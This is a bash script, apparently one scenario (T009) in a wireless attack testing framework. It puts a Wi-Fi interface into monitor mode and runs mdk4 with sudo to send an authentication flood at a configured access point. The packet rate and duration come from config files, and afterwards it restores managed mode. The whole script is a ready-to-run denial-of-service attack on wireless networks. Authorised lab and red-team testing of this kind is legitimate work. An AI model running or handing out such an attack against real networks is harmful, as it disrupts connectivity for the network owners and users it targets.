#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SERVICES_DIR="$BASH_DIR/services"
SCENARIO_DIR="$BASH_DIR/scenarios"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t009.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# ─── Run Attack ───
ensure_monitor_mode

print_blank
print_info "Running T009 - Authentication Flood attack against $T009_BSSID on channel $T009_CHANNEL at $T009_AUTH_PPS packets per second for $T009_DURATION seconds"
sudo timeout "$T009_DURATION" mdk4 "$INTERFACE" a -a "$T009_BSSID" -s "$T009_AUTH_PPS"
EXIT_CODE=$?

ensure_managed_mode

if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0